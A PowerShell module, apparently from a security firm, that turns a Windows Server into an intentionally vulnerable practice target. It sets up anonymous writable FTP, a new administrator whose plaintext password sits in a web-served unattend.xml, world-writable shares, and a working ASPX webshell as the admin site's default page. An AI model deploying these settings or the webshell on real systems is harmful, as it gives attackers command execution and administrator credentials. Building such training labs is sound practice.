#requires -version 2
<#
        File: Install-VulnerableFtpServer.psm1
        Author: Scott Sutherland (@_nullbind), NetSPI - 2018
        Version: 0.0.6
        Description: This script installs Microsoft FTP and IIS
        servers configured with insecure setting that could allow
        the compromise of the host.
        License: BSD 3-Clause
        Required Dependencies: PowerShell v.3
        Optional Dependencies: None
#>

# - clean up comments and code
# - add randomize web and ftp ports options
# - add random host head options from a list
# - change admin default webpage
# - verify header and webshells work


Function Install-VulnerableFtpServer
{
    <#
            .SYNOPSIS
            This script installs Microsoft FTP and IIS servers configured 
            with insecure setting that could allow the compromise of the host.
            Specifically, this function does the following:
            - Installs and FTP that allows anonymous write access.
            - Configures the FTP server's virtual directory to the default website's webroot.
            - Creates a random local adminsitrator account.
            - Generates an unattend.xml file in the webroot that contains the administrator's credentials.
            - Installs the default website.
            - Installs an SMB share that maps to the default website's webroot, and provides Everyone Full Control.
            - Installs an admin website that is accessible when the host header "admin" is provided.
            - The default page of the admin website is a webshell that allows OS command execution.
            .PARAMETER RandomizeFtpPort
            This will randomize the FTP port used.
            .PARAMETER RandomizeHttpPort
            This will randomize the HTTP port used.
            .EXAMPLE
            PS C:\> Install-VulnerableFtpServer
            ----------------------------------
            Building Vulnerabl FTP Server  
            ----------------------------------                       
             - Checking for local Administrator permissions
             - You have Administrator rights. Installation will continue.
             - Installing Required Features
             - Enabling Required Features
             - Importing Required Modules
             - Installing the FTP Server
             - Installing SSL support on the FTP server
             - Configuring anonymous access on the FTP server
             - Configuring write access for anonymous users
             - Configuring the Windows firewall to allow remote access to the FTP server
             - Enabling FTP logging
             - Creating file C:\inetpub\wwwroot\unattend.xml containing local administrator password
             - Creating default web site
             - Creating website accessible using the "admins" host header
             - Creating the webshell to be used for the default page for the admin site
             - Providing Everyone group with full control on C:\inetpub\wwwroot
             - Providing Everyone group with full control on SMB Share oYRMfdJx, mapped to C:\inetpub\wwwroot 
            ---------------------------------- 
            .NOTES
            This was only tested on Windows Server 2012 Standard.
            You can view the installed FTP server and IIS servers with the Get-Website command.
            You can view the installed SMB shares via the Get-SmbShareAccess command.        
    }
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'This will randomize the FTP port used.')]
        [Switch]$RandomizeFtpPort,

        [Parameter(Mandatory = $false,
        HelpMessage = 'This will randomize the HTTP port used.')]
        [String]$RandomizeHttpPort
    )
    Begin
    {
        Write-Output "----------------------------------"
        Write-Output "  Building Vulnerable FTP Server  "
        Write-Output "----------------------------------"
        Write-Output " - Checking for local Administrator permissions"

        # Check if the current process has elevated privs
        # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
        $IsAdmin = $prp.IsInRole($adm)
            
        if(-not $IsAdmin)
        {
            Write-Output "- You do not have Administrator rights. Run this function as an Administrator."
            break
        }else{
            Write-Output " - You have Administrator rights. Installation will continue."
        }
    }

    Process 
    {

        # Install required features
        Write-Output " - Installing Required Features"
        Install-WindowsFeature -name Web-Server -IncludeManagementTools -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        Install-WindowsFeature Web-FTP-Server -IncludeAllSubFeature -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null

        # Enable required features
        Write-Output " - Enabling Required Features"
        Enable-WindowsOptionalFeature -Online -FeatureName IIS-ASPNET45 -All | Out-Null
        Enable-WindowsOptionalFeature -Online -FeatureName IIS-ASP -All | Out-Null
        cmd.exe /c %windir%\system32\inetsrv\appcmd.exe unlock config -section:system.webServer/httpErrors | Out-Null
        cmd.exe /c %windir%\system32\inetsrv\appcmd.exe unlock config -section:system.webServer/asp | Out-Null
        cmd.exe /c %windir%\system32\inetsrv\appcmd.exe set config -section:system.webServer/httpErrors -errorMode:Detailed | Out-Null
        cmd.exe /c %windir%\system32\inetsrv\appcmd.exe set config -section:system.webServer/asp /scriptErrorSentToBrowser:"True" | Out-Null

        # Import required module
        Write-Output " - Importing Required Modules"
        Import-Module WebAdministration | Out-Null
        # Get-Module WebAdministration
        # Get-Command -module WebAdministration

        # Install the FTP server.
        Write-Output " - Installing the FTP Server"
        $FTPSiteName = 'Default FTP Site'
        $FTPRootDir = 'C:\inetpub\wwwroot'
        $DomainFTPLogDirectory =  'C:\inetpub\ftplogs'
        mkdir $DomainFTPLogDirectory -Force | Out-Null
        $FTPPort = 21
        New-WebFtpSite -Name $FTPSiteName -Port $FTPPort -PhysicalPath $FTPRootDir -Force | Out-Null
        cmd /c \Windows\System32\inetsrv\appcmd set SITE "$FTPSiteName" "-virtualDirectoryDefaults.physicalPath:C:\inetpub\wwwroot" | Out-Null        

        # Install SSL support on the FTP server
        Write-Output " - Installing SSL support on the FTP server"
        Set-ItemProperty "IIS:\Sites\$FTPSiteName" -Name ftpServer.security.ssl.controlChannelPolicy -Value 0 | Out-Null
        Set-ItemProperty "IIS:\Sites\$FTPSiteName" -Name ftpServer.security.ssl.dataChannelPolicy -Value 0 | Out-Null

        # Configure anonymous FTP access on the FTP server
        Write-Output " - Configuring anonymous access on the FTP server"
        Set-ItemProperty -Path IIS:\Sites\$FTPSiteName -Name ftpServer.security.authentication.anonymousAuthentication.enabled -Value $True | Out-Null
        
        # Authorize local administrators, users, and guests to access the ftp server
        Write-Output " - Configuring write access for anonymous users"
        cmd /c \Windows\System32\inetsrv\appcmd.exe set config "$FTPSiteName" -section:system.ftpServer/security/authorization /+"[accessType='Allow',roles='administrators',permissions='Read, Write']" /commit:apphost | Out-Null
        cmd /c \Windows\System32\inetsrv\appcmd.exe set config "$FTPSiteName" -section:system.ftpServer/security/authorization /+"[accessType='Allow',roles='users',permissions='Read, Write']" /commit:apphost | Out-Null
        cmd /c \Windows\System32\inetsrv\appcmd.exe set config "$FTPSiteName" -section:system.ftpServer/security/authorization /+"[accessType='Allow',users='guest',permissions='Read, Write']" /commit:apphost | Out-Null

        # Enable virtual directories in FTP Directory Browsing.
        Set-ItemProperty -Path IIS:\Sites\$FTPSiteName -Name ftpServer.directoryBrowse.showFlags -Value "DisplayVirtualDirectories" | Out-Null

        # Configure FTP Firewall Support (site level).
        Write-Output " - Configuring the Windows firewall to allow remote access to the FTP server"
        # cmd.exe /c NetSh Advfirewall set allprofiles state off
        Set-ItemProperty -Path IIS:\Sites\$FTPSiteName -Name ftpServer.firewallSupport.externalIp4Address -Value 0.0.0.0 | Out-Null        


        # Configure logging settings for the FTP site.
        Write-Output " - Enabling FTP logging"
        Set-ItemProperty -Path IIS:\Sites\$FTPSiteName -Name ftpServer.logFile.logExtFileFlags -Value "Date,Time,ClientIP,UserName,SiteName,ComputerName,ServerIP,Method,UriStem,FtpStatus,Win32Status,BytesSent,BytesRecv,TimeTaken,ServerPort,Host,FtpSubStatus,Session,FullPath,Info,ClientPort" | Out-Null
        Set-ItemProperty -Path IIS:\Sites\$FTPSiteName -Name ftpServer.logFile.directory -Value $DomainFTPLogDirectory | Out-Null
        Set-ItemProperty -Path IIS:\Sites\$FTPSiteName -Name ftpServer.logFile.localTimeRollover -Value $True | Out-Null    

        # Generate admin name
        $RandomNum = (-join ((0..99) | Get-Random -Count 10)).substring(0,6)
        $Username = "A$RandomNum" 

        # Generate admin password
        $Letters = (-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}))
        $Numbers = (-join ((0..9) | Get-Random -Count 2))  
        $Special = "!!@#$%^&*".ToCharArray();
        $GetSpecial = $Special | Get-Random -Count 1  
        $Password = "$Letters$Numbers$GetSpecial"

        # Create local administrator
        Write-Output " - Creating local administrator named $Username with password $Password" | Out-Null
        cmd /c "net user $Username $Password /add" | Out-Null
        cmd /c "net localgroup administrators /add $Username" | Out-Null

        # Get time zone
        $zone = [System.TimeZone]::CurrentTimeZone | Select-Object StandardName -ExpandProperty StandardName

        # Create sysprep file with local adminstrator credentials
        Write-Output " - Creating file $FTPRootDir\unattend.xml containing local administrator password"
        [string]$UnattendXml = "
        <?xml version='1.0' encoding='utf-8'?>
        <unattend xmlns='urn:schemas-microsoft-com:unattend'>
            <servicing></servicing>
            <settings pass='oobeSystem'>
                <component name='Microsoft-Windows-International-Core' processorArchitecture='amd64' publicKeyToken='31bf3856ad364e35' language='neutral' versionScope='nonSxS' xmlns:wcm='http://schemas.microsoft.com/WMIConfig/2002/State' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
                    <InputLocale>en-AU</InputLocale>
                    <SystemLocale>en-AU</SystemLocale>
                    <UILanguage>en-AU</UILanguage>
                    <UILanguageFallback>en-US</UILanguageFallback>
                    <UserLocale>en-AU</UserLocale>
                </component>
                <component name='Microsoft-Windows-Shell-Setup' processorArchitecture='amd64' publicKeyToken='31bf3856ad364e35' language='neutral' versionScope='nonSxS' xmlns:wcm='http://schemas.microsoft.com/WMIConfig/2002/State' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
                    <OOBE>
                        <HideEULAPage>true</HideEULAPage>
                        <HideLocalAccountScreen>true</HideLocalAccountScreen>
                        <HideOEMRegistrationScreen>true</HideOEMRegistrationScreen>
                        <HideOnlineAccountScreens>true</HideOnlineAccountScreens>
                        <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
                        <ProtectYourPC>3</ProtectYourPC>
                        <UnattendEnableRetailDemo>false</UnattendEnableRetailDemo>
                    </OOBE>
                    <UserAccounts>
                        <AdministratorPassword>
                            <Value>IDontLikeSharing!</Value>
                            <PlainText>true</PlainText>
                        </AdministratorPassword>
                        <LocalAccounts>
                            <LocalAccount wcm:action='add'>
						        <Name>$Username</Name>
						        <Description>This is a newly created admin.</Description>
                                <DisplayName>$Username</DisplayName>
                                <Password>
                                    <Value>$Password</Value>
                                    <PlainText>true</PlainText>
                                </Password>                       
                                <Group>Administrators</Group>
                            </LocalAccount>
                        </LocalAccounts>
                    </UserAccounts>
                </component>
            </settings>
            <settings pass='specialize'>
                <component name='Microsoft-Windows-Shell-Setup' processorArchitecture='amd64' publicKeyToken='31bf3856ad364e35' language='neutral' versionScope='nonSxS' xmlns:wcm='http://schemas.microsoft.com/WMIConfig/2002/State' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
                    <OEMName>$Username</OEMName>
                    <TimeZone>$zone</TimeZone>
                    <SignInMode>1</SignInMode>
                    <ShowWindowsLive>false</ShowWindowsLive>
                    <ShowPowerButtonOnStartScreen>true</ShowPowerButtonOnStartScreen>
                    <RegisteredOwner>You</RegisteredOwner>
                    <RegisteredOrganization>Your Organization</RegisteredOrganization>
                    <EnableStartMenu>true</EnableStartMenu>
                    <DoNotCleanTaskBar>false</DoNotCleanTaskBar>
                    <DisableAutoDaylightTimeSet>false</DisableAutoDaylightTimeSet>
                    <CopyProfile>false</CopyProfile>
                    <ConvertibleSlateModePromptPreference>0</ConvertibleSlateModePromptPreference>
                    <ComputerName>$env:COMPUTERNAME</ComputerName>
                    <BluetoothTaskbarIconEnabled>false</BluetoothTaskbarIconEnabled>
                </component>
                <component name='Microsoft-Windows-International-Core' processorArchitecture='amd64' publicKeyToken='31bf3856ad364e35' language='neutral' versionScope='nonSxS' xmlns:wcm='http://schemas.microsoft.com/WMIConfig/2002/State' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>
                    <InputLocale>en-AU</InputLocale>
                    <SystemLocale>en-AU</SystemLocale>
                    <UILanguage>en-AU</UILanguage>
                    <UILanguageFallback>en-US</UILanguageFallback>
                    <UserLocale>en-AU</UserLocale>
                </component>
            </settings>
            <cpi:offlineImage cpi:source='wim://G:/installation-media/en_windows_server/sources/install.wim#Windows Server 2016 SERVERSTANDARDACORE' xmlns:cpi='urn:schemas-microsoft-com:cpi' />
        </unattend>
        "

        # Write file to ftp/webroot
        $UnattendXml | Out-File "$FTPRootDir\unattend.xml"

        # Add website - default
        Write-Output " - Creating default web site" 
        Remove-Website 'Default Web Site' -ErrorAction SilentlyContinue | Out-Null
        Remove-Website 'Default Web Site' -ErrorAction SilentlyContinue | Out-Null
        $WebSiteName1 = "Default Web Site"
        New-Item "iis:\Sites\$WebSiteName1" -bindings @{protocol="http";bindingInformation=":80:*"} -physicalPath "$FTPRootDir" -Force | Out-Null
        Start-Website "$WebSiteName1"

        # Add website - vhost for admin site
        Write-Output " - Creating website accessible using the `"admins`" host header" 
        $FTPRootDir2 = "C:\inetpub\wwwroot2"
        copy C:\inetpub\wwwroot\ -Recurse $FTPRootDir2
        Remove-Website 'Admin Web Site' -ErrorAction SilentlyContinue | Out-Null
        New-Item "iis:\Sites\Admin Web Site" -bindings @{protocol="http";bindingInformation=":80:admin"} -physicalPath "$FTPRootDir2" -Force  | Out-Null

        # Add webshell to virtual host webroot
        # https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/web-backdoors/asp/cmd.aspx
        Write-Output " - Creating the webshell to be used for the default page for the admin site" 
        $WebShell = "
        <%@ Page Language='VB' Debug='true' %>
        <%@ import Namespace='system.IO' %>
        <%@ import Namespace='System.Diagnostics' %>

        <script runat='server'>      

        Sub RunCmd(Src As Object, E As EventArgs)            
          Dim myProcess As New Process()            
          Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
          myProcessStartInfo.UseShellExecute = false            
          myProcessStartInfo.RedirectStandardOutput = true            
          myProcess.StartInfo = myProcessStartInfo            
          myProcessStartInfo.Arguments=xcmd.text            
          myProcess.Start()            

          Dim myStreamReader As StreamReader = myProcess.StandardOutput            
          Dim myString As String = myStreamReader.Readtoend()            
          myProcess.Close()            
          mystring=replace(mystring,'<','&lt;')            
          mystring=replace(mystring,'>','&gt;')            
          result.text= vbcrlf & '<pre>' & mystring & '</pre>'    
        End Sub

        </script>

        <html>
        <body>    
        <form runat='server'>        
        <p><asp:Label id='L_p' runat='server' width='80px'>Program</asp:Label>        
        <asp:TextBox id='xpath' runat='server' Width='300px'>c:\windows\system32\cmd.exe</asp:TextBox>        
        <p><asp:Label id='L_a' runat='server' width='80px'>Arguments</asp:Label>        
        <asp:TextBox id='xcmd' runat='server' Width='300px' Text='/c net user'>/c net user</asp:TextBox>        
        <p><asp:Button id='Button' onclick='runcmd' runat='server' Width='100px' Text='Run'></asp:Button>        
        <p><asp:Label id='result' runat='server'></asp:Label>       
        </form>
        </body>
        </html>
        "

        # Write file to admin website webroot
        $WebShell | Out-File "$FTPRootDir2\index.aspx"

        # Update NTFS permissions on default website's webroot
        Write-Output " - Providing Everyone group with full control on $FTPRootDir" 
        $Acl = (Get-Item "$FTPRootDir").GetAccessControl('Access') 
        $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow") 
        $Acl.SetAccessRule($Ar) 
        Set-Acl "C:\inetpub\wwwroot" $Acl 

        # Create SMB share with everyone to the default websites webroot 
        $RandShareName = (-join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}))
        Write-Output " - Providing Everyone group with full control on SMB Share $RandShareName, mapped to $FTPRootDir"
        New-SMBShare –Name "$RandShareName" –Path "C:\inetpub\wwwroot" –FullAccess "Everyone" | Out-Null

        # Configure the default application pool to run as a the local adminsitrator
        Write-Output " - Configuring the default application pool to run as a the local adminsitrator $Username" 
        $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($Username, $secpass)                
        Set-ItemProperty IIS:\AppPools\DefaultAppPool -name processModel.identityType -Value SpecificUser 
        Set-ItemProperty IIS:\AppPools\DefaultAppPool -name processModel.userName -Value $username
        Set-ItemProperty IIS:\AppPools\DefaultAppPool -name processModel.password -Value $Password
        Restart-WebAppPool "DefaultAppPool"

        Write-Output "----------------------------------"

        Write-Output " "
        Write-Output "Displaying FTP and Website states"
        Get-Website
        Write-Output " "
        Write-Output "Displaying Website application pools"
        #Get-ChildItem –Path IIS:\AppPools
        Get-WebAppPoolState | select *
        #Get-ItemProperty IIS:\AppPools\DefaultAppPool | select *        
        Write-Output " "
        Write-Output "Displaying SMB Share state"
        Get-SmbShareAccess $RandShareName
    }

    End
    {
    }              
}
